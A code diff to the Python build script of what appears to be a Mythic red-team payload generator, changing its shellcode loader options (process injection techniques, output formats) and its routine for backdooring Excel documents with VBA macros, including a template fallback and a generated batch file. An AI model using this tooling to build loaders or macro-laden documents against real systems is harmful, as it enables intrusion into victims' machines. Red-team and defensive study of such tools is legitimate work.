@@ -195,10 +195,15 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "Select the loader's output format. "
                 "exe = standard PE executable. "
                 "dll = DLL (side-loadable, regsvr32). "
-                "cpl = Control Panel applet (loaded via control.exe or double-click). "
+                # "cpl = Control Panel applet (loaded via control.exe or double-click). "
                 "xll = Excel Add-In DLL (xlAutoOpen trigger)"
             ),
-            choices = ["exe", "dll", "cpl", "xll"],
+            choices = [
+                "exe", 
+                "dll", 
+                # "cpl", # not functional currently in v0.0.2
+                "xll"
+                ],
             default_value = "exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
@@ -255,13 +260,12 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             name = "0.4 Shellcode Loader - Injection Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = """Select the injection technique for the Shellcode Loader:
-1 = NtQueueApcThread (Remote)
-2 = NtMapViewOfSection (Remote)
-3 = CreateFiber (Self)
-4 = EarlyCascade (Remote)
-5 = PoolParty (Remote)""",
-            choices = ["1", "2", "3", "4", "5"],
-            default_value = "1",
+1 = NtMapViewOfSection (Remote)
+2 = CreateFiber (Self)
+3 = EarlyCascade / NtQueueApcThread (Remote)
+4 = PoolParty (Remote)""",
+            choices = ["1", "2", "3", "4"],
+            default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
             ]
@@ -274,7 +278,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "C:\\Windows\\System32\\notepad.exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
-                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
             ]
         ),
 
@@ -1282,8 +1286,8 @@ generated if none have been entered.""",
         BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                   step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),
 
-        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
-                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
+        # BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
+        #           step_description = "Compiling CPL Applet with Obfuscated Shellcode"),
 
         BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
                   step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),
@@ -2137,7 +2141,7 @@ generated if none have been entered.""",
                     encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                     config_data = {
                         "TARGET_PROCESS": "",
-                        "INJECTION_TYPE": 3,  # CreateFiber (self-injection) - DLL runs in the hijacked process
+                        "INJECTION_TYPE": 2,  # CreateFiber (self-injection) - DLL runs in the hijacked process
                         "COMPRESSION_TYPE": compression_type_value,
                         "ENCODING_TYPE": encoding_type_value,
                         "ENCRYPTION_TYPE": encryption_type_value,
@@ -3054,7 +3058,13 @@ static size_t key_len = sizeof(key);
                         excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                         template_path = _plugin._resolve_template_path(excel_output)
 
+                        # Ship the template into the payload directory so the helper
+                        # can use it on the operator's Windows host
+                        shipped_template_name = None
                         if template_path and template_path.exists():
+                            shipped_template_name = template_path.name
+                            shutil.copy2(str(template_path), str(payload_dir / shipped_template_name))
+
                             _plugin.create_new_excel_with_payload(
                                 output_path=excel_output,
                                 vba_code=vba_code,
@@ -3074,10 +3084,13 @@ static size_t key_len = sizeof(key);
                             output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
 
                         # Also emit build_maldoc.bat for Windows-side COM re-injection
+                        bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"'
+                        if shipped_template_name:
+                            bat_cmd += f' --template "{shipped_template_name}"'
                         bat_lines = [
                             "@echo off",
                             f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
-                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                            bat_cmd,
                             "echo MalDoc created: %errorlevel%",
                         ]
                         bat_path = payload_dir / "build_maldoc.bat"
@@ -3087,38 +3100,51 @@ static size_t key_len = sizeof(key);
                     else:  # Backdoor Existing
                         maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
 
-                        # Get the uploaded Excel file
-                        excel_uuid = self.get_parameter("0.9b Excel Source File")
-                        if not excel_uuid:
-                            raise ValueError("No Excel file provided for backdooring")
-
-                        file_resp = await SendMythicRPCFileGetContent(
-                            MythicRPCFileGetContentMessage(AgentFileId=excel_uuid)
-                        )
-
-                        if not file_resp.Success:
-                            raise ValueError("Failed to retrieve Excel file")
-
-                        # Get original filename
-                        file_name_resp = await SendMythicRPCFileSearch(
-                            MythicRPCFileSearchMessage(AgentFileID=excel_uuid)
-                        )
-
-                        original_filename = "document.xlsm"
-                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
-                            original_filename = file_name_resp.Files[0].Filename
-
-                        # Keep the uploaded source file in the payload directory
-                        source_excel_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
-                        source_excel_path = payload_dir / source_excel_name
-                        source_excel_path.write_bytes(file_resp.Content)
-
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                         _plugin = _MDP()
 
                         # Export .bas for manual re-injection if needed
                         bas_output = payload_dir / f"{doc_name}_payload.bas"
                         _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)
+
+                        # Try to get the uploaded Excel file
+                        excel_uuid = self.get_parameter("0.9b Excel Source File")
+                        source_excel_path = None
+                        source_excel_name = None
+                        original_filename = None
+
+                        if excel_uuid:
+                            file_resp = await SendMythicRPCFileGetContent(
+                                MythicRPCFileGetContentMessage(AgentFileId=excel_uuid)
+                            )
+                            if file_resp.Success:
+                                file_name_resp = await SendMythicRPCFileSearch(
+                                    MythicRPCFileSearchMessage(AgentFileID=excel_uuid)
+                                )
+                                original_filename = "document.xlsm"
+                                if file_name_resp.Success and len(file_name_resp.Files) > 0:
+                                    original_filename = file_name_resp.Files[0].Filename
+
+                                # Keep the uploaded source file in the payload directory
+                                source_excel_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
+                                source_excel_path = payload_dir / source_excel_name
+                                source_excel_path.write_bytes(file_resp.Content)
+
+                        # Fall back to template if no file was uploaded or retrieval failed
+                        if source_excel_path is None:
+                            template_path = _plugin._resolve_template_path(
+                                payload_dir / f"{doc_name}.{maldoc_fmt}"
+                            )
+                            if template_path and template_path.exists():
+                                original_filename = template_path.name
+                                source_excel_name = template_path.name
+                                source_excel_path = payload_dir / source_excel_name
+                                shutil.copy2(str(template_path), str(source_excel_path))
+                                output += f"[*] No Excel file uploaded, using {template_path.name} template\n"
+                            else:
+                                raise ValueError(
+                                    "No Excel file provided for backdooring and no template found"
+                                )
 
                         # Compile the backdoored Excel directly
                         output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
@@ -3135,10 +3161,11 @@ static size_t key_len = sizeof(key);
                         output += f"[+] Created backdoored {maldoc_fmt.upper()}: {excel_output.name}\n"
 
                         # Also emit build_maldoc.bat for Windows-side COM re-injection
+                        bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"'
                         bat_lines = [
                             "@echo off",
                             f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
-                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
+                            bat_cmd,
                             "echo MalDoc created: %errorlevel%",
                         ]
                         bat_path = payload_dir / "build_maldoc.bat"
